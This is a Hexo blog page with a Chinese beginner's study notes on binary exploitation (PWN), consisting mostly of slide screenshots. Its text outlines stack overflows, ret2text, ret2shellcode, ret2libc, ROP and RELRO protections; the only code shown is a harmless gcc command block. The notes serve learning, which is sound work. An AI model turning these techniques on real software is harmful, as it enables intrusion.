@@ -1,0 +1,790 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 4.2.1">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"yoursite.com","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":true},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
+  </script>
+
+  <meta name="description" content="PWN纯零基础，大佬请略过">
+<meta property="og:type" content="article">
+<meta property="og:title" content="PWN学习">
+<meta property="og:url" content="http://yoursite.com/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/index.html">
+<meta property="og:site_name" content="Pz1o&#39;s blog">
+<meta property="og:description" content="PWN纯零基础，大佬请略过">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://yoursite.com/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/1603543652982.jpeg">
+<meta property="og:image" content="http://yoursite.com/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201024233545234.png">
+<meta property="og:image" content="http://yoursite.com/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201027230103100.png">
+<meta property="og:image" content="http://yoursite.com/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201027230424200.png">
+<meta property="og:image" content="http://yoursite.com/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201028164523021.png">
+<meta property="og:image" content="http://yoursite.com/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201028164758641.png">
+<meta property="og:image" content="http://yoursite.com/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201028165455072.png">
+<meta property="og:image" content="http://yoursite.com/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201028170244054.png">
+<meta property="og:image" content="http://yoursite.com/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201028171316681.png">
+<meta property="og:image" content="http://yoursite.com/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201028175015154.png">
+<meta property="og:image" content="http://yoursite.com/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201028175324930.png">
+<meta property="og:image" content="http://yoursite.com/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201028175515114.png">
+<meta property="og:image" content="http://yoursite.com/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201028180055683.png">
+<meta property="og:image" content="http://yoursite.com/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201028180509024.png">
+<meta property="og:image" content="http://yoursite.com/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201028181509843.png">
+<meta property="og:image" content="http://yoursite.com/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201028182158445.png">
+<meta property="og:image" content="http://yoursite.com/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201028182509458.png">
+<meta property="og:image" content="http://yoursite.com/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201028182719496.png">
+<meta property="og:image" content="http://yoursite.com/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201028183231684.png">
+<meta property="og:image" content="http://yoursite.com/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201028183244082.png">
+<meta property="og:image" content="http://yoursite.com/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201028183715008.png">
+<meta property="og:image" content="http://yoursite.com/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201028210304426.png">
+<meta property="og:image" content="http://yoursite.com/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201028210843823.png">
+<meta property="og:image" content="http://yoursite.com/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201028212002026.png">
+<meta property="og:image" content="http://yoursite.com/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201028212037049.png">
+<meta property="og:image" content="http://yoursite.com/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201028212448211.png">
+<meta property="og:image" content="http://yoursite.com/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201028212603675.png">
+<meta property="og:image" content="http://yoursite.com/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201028213307651.png">
+<meta property="og:image" content="http://yoursite.com/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201028213458423.png">
+<meta property="og:image" content="http://yoursite.com/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201028213648493.png">
+<meta property="og:image" content="http://yoursite.com/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201028213849813.png">
+<meta property="og:image" content="http://yoursite.com/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201028215303342.png">
+<meta property="og:image" content="http://yoursite.com/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201029211445528.png">
+<meta property="og:image" content="http://yoursite.com/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201028215837467.png">
+<meta property="og:image" content="http://yoursite.com/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201028220533860.png">
+<meta property="og:image" content="http://yoursite.com/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201029210250310.png">
+<meta property="og:image" content="http://yoursite.com/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201103230658840.png">
+<meta property="og:image" content="http://yoursite.com/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201103232118467.png">
+<meta property="og:image" content="http://yoursite.com/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201103231611494.png">
+<meta property="og:image" content="http://yoursite.com/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201111165405311.png">
+<meta property="og:image" content="http://yoursite.com/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201111170622828.png">
+<meta property="og:image" content="http://yoursite.com/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201112200053036.png">
+<meta property="og:image" content="http://yoursite.com/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201112201440668.png">
+<meta property="og:image" content="http://yoursite.com/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201105154134220.png">
+<meta property="og:image" content="http://yoursite.com/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201105160249721.png">
+<meta property="og:image" content="http://yoursite.com/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201105191117470.png">
+<meta property="og:image" content="http://yoursite.com/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201105192140397.png">
+<meta property="og:image" content="http://yoursite.com/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201105193656915.png">
+<meta property="og:image" content="http://yoursite.com/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201105200045153.png">
+<meta property="og:image" content="http://yoursite.com/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201115233600880.png">
+<meta property="og:image" content="http://yoursite.com/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201116194218608.png">
+<meta property="og:image" content="http://yoursite.com/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201106223140061.png">
+<meta property="og:image" content="http://yoursite.com/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201106232428225.png">
+<meta property="og:image" content="http://yoursite.com/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201106233935531.png">
+<meta property="og:image" content="http://yoursite.com/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201103231211223.png">
+<meta property="og:image" content="http://yoursite.com/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201103231430738.png">
+<meta property="og:image" content="http://yoursite.com/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201117163123759.png">
+<meta property="og:image" content="http://yoursite.com/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201117165305864.png">
+<meta property="og:image" content="http://yoursite.com/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201117165321403.png">
+<meta property="og:image" content="http://yoursite.com/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201117203103431.png">
+<meta property="og:image" content="http://yoursite.com/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201117213226675.png">
+<meta property="og:image" content="http://yoursite.com/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201118152914484.png">
+<meta property="og:image" content="http://yoursite.com/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201118173315748.png">
+<meta property="og:image" content="http://yoursite.com/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201118223608385.png">
+<meta property="og:image" content="http://yoursite.com/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201118224006678.png">
+<meta property="og:image" content="http://yoursite.com/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201118230656646.png">
+<meta property="og:image" content="http://yoursite.com/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201119110607276.png">
+<meta property="og:image" content="http://yoursite.com/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201118233221511.png">
+<meta property="og:image" content="http://yoursite.com/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201119105945419.png">
+<meta property="og:image" content="http://yoursite.com/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201119110352335.png">
+<meta property="og:image" content="http://yoursite.com/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201119110501531.png">
+<meta property="og:image" content="http://yoursite.com/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201119114224011.png">
+<meta property="og:image" content="http://yoursite.com/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201119162311702.png">
+<meta property="og:image" content="http://yoursite.com/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201119115539452.png">
+<meta property="og:image" content="http://yoursite.com/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201119162151833.png">
+<meta property="og:image" content="http://yoursite.com/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201119163702351.png">
+<meta property="og:image" content="http://yoursite.com/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201119120748019.png">
+<meta property="og:image" content="http://yoursite.com/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/1.png">
+<meta property="og:image" content="http://yoursite.com/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201119163039733.png">
+<meta property="og:image" content="http://yoursite.com/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201119163232880.png">
+<meta property="og:image" content="http://yoursite.com/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201119163209378.png">
+<meta property="og:image" content="http://yoursite.com/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201119163319068.png">
+<meta property="og:image" content="http://yoursite.com/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201119163433718.png">
+<meta property="og:image" content="http://yoursite.com/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201119163457182.png">
+<meta property="og:image" content="http://yoursite.com/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201119115142092.png">
+<meta property="og:image" content="http://yoursite.com/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201119163935171.png">
+<meta property="og:image" content="http://yoursite.com/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201107232027030.png">
+<meta property="og:image" content="http://yoursite.com/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201112215451308.png">
+<meta property="og:image" content="http://yoursite.com/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201113183137009.png">
+<meta property="og:image" content="http://yoursite.com/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201113202023659.png">
+<meta property="og:image" content="http://yoursite.com/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201113202640601.png">
+<meta property="og:image" content="http://yoursite.com/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201116200344612.png">
+<meta property="og:image" content="http://yoursite.com/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201117174620932.png">
+<meta property="og:image" content="http://yoursite.com/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201117174719721.png">
+<meta property="article:published_time" content="2020-10-24T14:32:31.000Z">
+<meta property="article:modified_time" content="2020-11-19T12:27:05.811Z">
+<meta property="article:author" content="Pz1o">
+<meta property="article:tag" content="PWN">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://yoursite.com/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/1603543652982.jpeg">
+
+<link rel="canonical" href="http://yoursite.com/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>PWN学习 | Pz1o's blog</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">Pz1o's blog</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>
+
+  </li>
+  </ul>
+</nav>
+
+
+
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/timg.jpeg">
+      <meta itemprop="name" content="Pz1o">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Pz1o's blog">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          PWN学习
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2020-10-24 22:32:31" itemprop="dateCreated datePublished" datetime="2020-10-24T22:32:31+08:00">2020-10-24</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2020-11-19 20:27:05" itemprop="dateModified" datetime="2020-11-19T20:27:05+08:00">2020-11-19</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/PWN/" itemprop="url" rel="index"><span itemprop="name">PWN</span></a>
+                </span>
+            </span>
+
+          
+            <span class="post-meta-item" title="阅读次数" id="busuanzi_container_page_pv" style="display: none;">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-eye"></i>
+              </span>
+              <span class="post-meta-item-text">阅读次数：</span>
+              <span id="busuanzi_value_page_pv"></span>
+            </span>
+            <span class="post-meta-item" title="本文字数">
+              <span class="post-meta-item-icon">
+                <i class="far fa-file-word"></i>
+              </span>
+                <span class="post-meta-item-text">本文字数：</span>
+              <span>7.5k</span>
+            </span>
+            <span class="post-meta-item" title="阅读时长">
+              <span class="post-meta-item-icon">
+                <i class="far fa-clock"></i>
+              </span>
+                <span class="post-meta-item-text">阅读时长 &asymp;</span>
+              <span>7 分钟</span>
+            </span>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <h1 id="PWN"><a href="#PWN" class="headerlink" title="PWN"></a>PWN</h1><p>纯零基础，大佬请略过</p>
+<a id="more"></a>
+<p>从零开始学习PWN,Web会去学，但可能现在大部分时间会用在PWN上，如果需要题的话可以评论</p>
+<p><img src="/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/1603543652982.jpeg" alt="1603543652982"></p>
+<p>大学中是研究深度还是广度，我可能还是需要选择一下</p>
+<p>基本全是ppt截图</p>
+<h1 id="基础"><a href="#基础" class="headerlink" title="基础"></a>基础</h1><p><img src="/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201024233545234.png" alt="image-20201024233545234"></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">gcc -S a.c #生成汇编文件</span><br><span class="line">file a.s #查看文件类型  可以看见是ascii文本</span><br><span class="line">gcc a.s  #生成可执行文件</span><br><span class="line">file a.out #可以看见是可执行文件</span><br></pre></td></tr></table></figure>
+<p><img src="/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201027230103100.png" alt="image-20201027230103100"></p>
+<h2 id="ELF文件"><a href="#ELF文件" class="headerlink" title="ELF文件"></a>ELF文件</h2><p><img src="/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201027230424200.png" alt="image-20201027230424200"></p>
+<p><img src="/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201028164523021.png" alt="image-20201028164523021"></p>
+<p><img src="/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201028164758641.png" alt="image-20201028164758641"></p>
+<p><img src="/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201028165455072.png" alt="image-20201028165455072"></p>
+<h2 id="虚拟内存"><a href="#虚拟内存" class="headerlink" title="虚拟内存"></a>虚拟内存</h2><p><img src="/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201028170244054.png" alt="image-20201028170244054"></p>
+<p><img src="/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201028171316681.png" alt="image-20201028171316681"></p>
+<p><img src="/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201028175015154.png" alt="image-20201028175015154"></p>
+<p><img src="/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201028175324930.png" alt="image-20201028175324930"></p>
+<p><img src="/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201028175515114.png" alt="image-20201028175515114"></p>
+<h2 id="程序编译与链接"><a href="#程序编译与链接" class="headerlink" title="程序编译与链接"></a>程序编译与链接</h2><p><img src="/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201028180055683.png" alt="image-20201028180055683"></p>
+<p><img src="/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201028180509024.png" alt="image-20201028180509024"></p>
+<h2 id="程序装载与进程执行"><a href="#程序装载与进程执行" class="headerlink" title="程序装载与进程执行"></a>程序装载与进程执行</h2><p><img src="/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201028181509843.png" alt="image-20201028181509843"></p>
+<p><img src="/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201028182158445.png" alt="image-20201028182158445"></p>
+<p><img src="/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201028182509458.png" alt="image-20201028182509458"></p>
+<h2 id="汇编指令"><a href="#汇编指令" class="headerlink" title="汇编指令"></a>汇编指令</h2><p><img src="/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201028182719496.png" alt="image-20201028182719496"></p>
+<p><img src="/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201028183231684.png" alt="image-20201028183231684"></p>
+<p><img src="/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201028183244082.png" alt="image-20201028183244082"></p>
+<p><img src="/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201028183715008.png" alt="image-20201028183715008"></p>
+<h1 id="栈溢出基础"><a href="#栈溢出基础" class="headerlink" title="栈溢出基础"></a>栈溢出基础</h1><h2 id="基本原理"><a href="#基本原理" class="headerlink" title="基本原理"></a><strong>基本原理</strong></h2><p><img src="/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201028210304426.png" alt="image-20201028210304426"></p>
+<p><img src="/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201028210843823.png" alt="image-20201028210843823"></p>
+<p><img src="/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201028212002026.png" alt="image-20201028212002026"></p>
+<p><img src="/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201028212037049.png" alt="image-20201028212037049"></p>
+<p><img src="/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201028212448211.png" alt="image-20201028212448211"></p>
+<p><img src="/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201028212603675.png" alt="image-20201028212603675"></p>
+<p><img src="/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201028213307651.png" alt="image-20201028213307651"></p>
+<p><img src="/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201028213458423.png" alt="image-20201028213458423"></p>
+<p><img src="/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201028213648493.png" alt="image-20201028213648493"></p>
+<h2 id="实例"><a href="#实例" class="headerlink" title="实例"></a><strong>实例</strong></h2><p><img src="/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201028213849813.png" alt="image-20201028213849813"></p>
+<p><img src="/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201028215303342.png" alt="image-20201028215303342"></p>
+<p><img src="/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201029211445528.png" alt="image-20201029211445528"></p>
+<h2 id="攻击"><a href="#攻击" class="headerlink" title="攻击"></a><strong>攻击</strong></h2><p><img src="/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201028215837467.png" alt="image-20201028215837467"></p>
+<p><img src="/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201028220533860.png" alt="image-20201028220533860"></p>
+<h3 id="ret2text"><a href="#ret2text" class="headerlink" title="ret2text"></a>ret2text</h3><p>返回地址为后门地址</p>
+<p><img src="/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201029210250310.png" alt="image-20201029210250310"></p>
+<h3 id="ret2shellcode"><a href="#ret2shellcode" class="headerlink" title="ret2shellcode"></a>ret2shellcode</h3><p>返回地址为写入的shellcode的地址</p>
+<p><strong>栈中写入shellcode</strong></p>
+<p><img src="/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201103230658840.png" alt="image-20201103230658840"></p>
+<p><strong>bss段写入shellcode</strong></p>
+<p><img src="/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201103232118467.png" alt="image-20201103232118467"></p>
+<h3 id="ret2libc"><a href="#ret2libc" class="headerlink" title="ret2libc"></a>ret2libc</h3><p><img src="/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201103231611494.png" alt="image-20201103231611494"></p>
+<p><img src="/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201111165405311.png" alt="image-20201111165405311"></p>
+<p><img src="/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201111170622828.png" alt="image-20201111170622828"></p>
+<p><img src="/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201112200053036.png" alt="image-20201112200053036"></p>
+<p><img src="/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201112201440668.png" alt="image-20201112201440668"></p>
+<h1 id="返回导向编程"><a href="#返回导向编程" class="headerlink" title="返回导向编程"></a>返回导向编程</h1><h2 id="基础-1"><a href="#基础-1" class="headerlink" title="基础"></a>基础</h2><p><img src="/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201105154134220.png" alt="image-20201105154134220"></p>
+<p><img src="/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201105160249721.png" alt="image-20201105160249721"></p>
+<h2 id="攻击-1"><a href="#攻击-1" class="headerlink" title="攻击"></a>攻击</h2><p><img src="/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201105191117470.png" alt="image-20201105191117470"></p>
+<p><img src="/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201105192140397.png" alt="image-20201105192140397"></p>
+<p><img src="/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201105193656915.png" alt="image-20201105193656915"></p>
+<p><strong>调用构造</strong></p>
+<p><img src="/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201105200045153.png" alt="image-20201105200045153"></p>
+<h2 id="x64"><a href="#x64" class="headerlink" title="x64"></a>x64</h2><p>存放参数放入寄存器中</p>
+<p>但超过6个就会放入栈中</p>
+<p><img src="/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201115233600880.png" alt="image-20201115233600880"></p>
+<p><img src="/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201116194218608.png" alt="image-20201116194218608"></p>
+<h1 id="动态链接过程"><a href="#动态链接过程" class="headerlink" title="动态链接过程"></a>动态链接过程</h1><p><img src="/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201106223140061.png" alt="image-20201106223140061"></p>
+<p><img src="/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201106232428225.png" alt="image-20201106232428225"></p>
+<p><img src="/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201106233935531.png" alt="image-20201106233935531"></p>
+<h1 id="保护措施"><a href="#保护措施" class="headerlink" title="保护措施"></a>保护措施</h1><h2 id="RELRO"><a href="#RELRO" class="headerlink" title="RELRO"></a>RELRO</h2><p>Relocation Read-Only </p>
+<p>它分为两种，Partial RELRO 和 Full RELRO，即 部分RELRO 和 完全RELRO。</p>
+<p><strong>部分RELRO</strong> 是 GCC 的默认设置，几乎所有的二进制文件都至少使用 部分RELRO。但是从攻击者角度来看呢，部分RELRO 不堪一击，因为它仅仅使 GOT 存储在 bss 段之前，这样仅仅只能防止全局变量上的缓冲区溢出从而覆盖 GOT。<br><strong>完全RELRO</strong> 使整个 GOT 只读，从而无法被覆盖，但这样会大大增加程序的启动时间，因为程序在启动之前需要解析所有的符号。</p>
